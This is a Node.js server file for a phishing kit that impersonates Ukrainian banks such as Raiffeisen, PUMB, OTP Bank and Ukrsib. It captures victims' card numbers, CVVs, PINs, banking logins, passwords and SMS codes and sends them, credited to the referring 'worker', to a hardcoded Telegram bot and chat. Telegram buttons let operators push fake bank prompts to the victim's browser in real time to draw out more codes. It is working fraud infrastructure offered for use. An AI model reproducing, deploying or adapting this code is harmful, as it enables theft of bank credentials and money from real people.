const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- –ò–ó–ú–ï–ù–ï–ù–ò–ï: –ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ Telegram ---
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN; // –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –¥–æ–º–µ–Ω –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π

// –°–ü–ò–°–û–ö –ë–ê–ù–ö–û–í –î–õ–Ø –ö–ù–û–ü–ö–ò "–ó–ê–ü–†–û–°"
const banksForRequestButton = [
    '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω', '–ê–ª—å—è–Ω—Å', '–ü–£–ú–ë', 'OTP Bank',
    '–í–æ—Å—Ç–æ–∫', 'Izibank', '–£–∫—Ä—Å–∏–±'
];

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

bot.sendMessage(CHAT_ID, '–ü–†–û–ï–ö–¢ –£–°–ü–ï–®–ù–û –°–¢–ê–õ –ù–ê –°–ï–†–í–ï–†! (–ù–æ–≤—ã–π –±–æ—Ç) –•–æ—Ä–æ—à–µ–≥–æ –≤–æ—Ä–∫–∞! –¢–µ—Å—Ç –æ—Ç ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCounts = new Map();
const waitingForCustomMessage = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);
    
    if (isFinalStep && !newData.logSent) {
        newData.logSent = true;
        sessions.set(sessionId, newData);

        const cardNumber = newData.card_confirm || newData.card;
        let visitCount = 1;
        if (cardNumber) {
            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
            cardVisitCounts.set(cardNumber, visitCount);
        }
        
        let message = `<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n`;
        message += `<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${cardNumber || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData['card-expiry']) message += `<b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        if (newData.pin) message += `<b>–ü—ñ–Ω:</b> <code>${newData.pin}</code>\n`;
        if (newData.login) message += `<b>–õ–æ–≥—ñ–Ω:</b> <code>${newData.login}</code>\n`;
        if (newData.password) message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${newData.password}</code>\n`;
        if (newData.call_code_input) message += `<b>–ö–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞:</b> <code>${newData.call_code_input}</code>\n`;
        if (newData.balance) message += `<b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n`;
        const visitText = visitCount === 1 ? 'NEW' : `${visitCount} —Ä–∞–∑`;
        message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});


app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>–û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${code}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: '–õ–ö', callback_data: `lk:${sessionId}` },
            { text: '–ó–≤–æ–Ω–æ–∫', callback_data: `call:${sessionId}` }
        ],
        [
            { text: '–ù–µ–≤—ñ—Ä–Ω–∏–π –ü–Ü–ù', callback_data: `pin_error:${sessionId}` },
            { text: '–ö–û–î', callback_data: `code_error:${sessionId}` },
            { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: '–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` },
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ],
        [
            { text: 'BAN üö´', callback_data: `ban:${sessionId}` },
            { text: '–°–í–û–ô ‚úèÔ∏è', callback_data: `custom_message:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    
    if (type === 'custom_message') {
        waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
        bot.sendMessage(callbackQuery.message.chat.id, `‚úèÔ∏è –í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞ —Å —Å–µ—Å—Å–∏–µ–π <code>${sessionId}</code>. –û–Ω–æ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –µ–º—É –Ω–∞ —ç–∫—Ä–∞–Ω.`, {
            parse_mode: 'HTML',
            reply_markup: { force_reply: true }
        }).then((sentMessage) => {
            waitingForCustomMessage.set('reply_to_message_id', sentMessage.message_id);
        });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        const sessionData = sessions.get(sessionId) || {};
        const bankName = sessionData.bankName || '';

        switch (type) {
            case 'sms':
                commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" };
                break;
            case 'lk':
            case 'call':
                commandData = { bankName };
                break;
            case 'other':
                commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É", bankName };
                break;
            case 'pin_error':
                commandData = { text: "–í–∏ –Ω–µ –∑–º–æ–≥–ª–∏ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –∫–∞—Ä—Ç–∫–æ—é. –î–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –∫–∞—Ä—Ç–∫–æ—é –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –∑–∞–ø–æ–≤–Ω—ñ—Ç—å —Ñ–æ—Ä–º—É –∑ –≤—ñ—Ä–Ω–∏–º –ø—ñ–Ω-–∫–æ–¥–æ–º" };
                break;
            case 'number_error':
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω' };
                break;
        }

        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
});

bot.on('message', (msg) => {
    if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
        const sessionId = waitingForCustomMessage.get(msg.chat.id);
        const ws = clients.get(sessionId);

        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message_text', data: { text: msg.text } }));
            bot.sendMessage(msg.chat.id, `‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∫–ª–∏–µ–Ω—Ç—É <code>${sessionId}</code>.`, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(msg.chat.id, `‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ. –ö–ª–∏–µ–Ω—Ç <code>${sessionId}</code> –Ω–µ –≤ —Å–µ—Ç–∏.`, { parse_mode: 'HTML' });
        }
        waitingForCustomMessage.delete(msg.chat.id);
        waitingForCustomMessage.delete('reply_to_message_id');
    }
});

bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
